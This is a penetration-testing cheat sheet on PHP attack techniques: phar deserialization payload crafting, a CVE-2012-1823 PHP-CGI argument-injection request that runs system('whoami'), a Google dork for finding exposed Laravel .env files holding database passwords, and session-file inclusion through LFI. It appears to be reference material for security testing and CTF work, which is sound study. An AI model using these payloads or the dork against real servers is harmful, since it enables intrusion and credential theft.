PHP
===


## Deserialization

### Phar deserialization
The unserialization of a `phar` wrapper is realized in any file operation. Thus,
file operation such as `file_exists` might be less protected, then it's possible
to inject a `phar` wrapper within it.

The following code describes how to create a `phar` wrapper:

```php
<?php

require('weak_class.php');
# We craft an object by overwriting some methods and functions
$obj = new WeakClass();
$obj->args = "id";

# Then, we serialize the object to a file
file_put_contents("/tmp/exploit.phar", serialize($obj));
```

Here is an example of exploitable functions:

```
copy
file_exists
file_get_contents
file_put_contents
file
fileatime
filectime
filegroup
fileinode
filemtime
fileowner
fileperms
filesize
filetype
fopen
is_dir
is_executable
is_file
is_link
is_readable
is_writable
lstat
mkdir
parse_ini_file
readfile
rename
rmdir
stat
touch
unlink
```


## CVE-2012-1823: RCE in PHP-CGI

PHP-CGI up to version 5.3.12 and 5.4.2 is vulnerable to an argument injection.

You can show the page source code:
```
GET https://<host>/file.php?-s
```

Or even execute PHP scripts (or a remote code execution)
```
POST https://<host>/file.php?-d%20allow_url_include%3d1%20-d%20auto_prepend_file%3dphp://input

<?php system('whoami'); ?>
```

More details can be found on the Metasploit script [here](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/php_cgi_arg_injection.rb)



## Laravel configuration file

The Laravel configuration file is sometimes exposed on the Internet with a dotEnv
file at the root level of the web server:

```
https://<host>/.env
```

You can find vulnerable target using a Google dork:

```
"DB_PASSWORD" filetype:env
```


## PHP session files

On PHP the directive [`session.save_path`](https://www.php.net/manual/en/session.configuration.php#ini.session.save-path)
set the folder where PHP will store the session files. So the session files are
written on the disk. A malicious user may read this files to retrieve information.

On a Windows system (IIS), the default value create files in `C:\Windows\Temp`
with the name `sess_<session_id>`. The `<session_id>` is the value of the
`PHPSESSIONID` cookie. When you have a `Local File Inclusion` (LFI) vulnerability,
it's possible to include this kind of files.

This file contains some user's session variable. So a user can write some PHP
code like `<?php phpinfo() ?>` (as a username for example) in his session and
try to include the file to execute the PHP code.

Here is 2 examples of exploitation:

- The `Alcatel Omnivista 8770` uses this trick to fetch some internal session variable
from the user session. The [exploit](https://www.exploit-db.com/exploits/47761)
gets the session file that is accessible on the server `/session/sess_<session_id>`.

- `ippsec` use this technique in the HTB box [`Sniper`](https://www.youtube.com/watch?v=k7gD4ufex9Q&t=3255s)
to create a use with a username that contains some PHP code. Then he includes
the session file with a LFI.
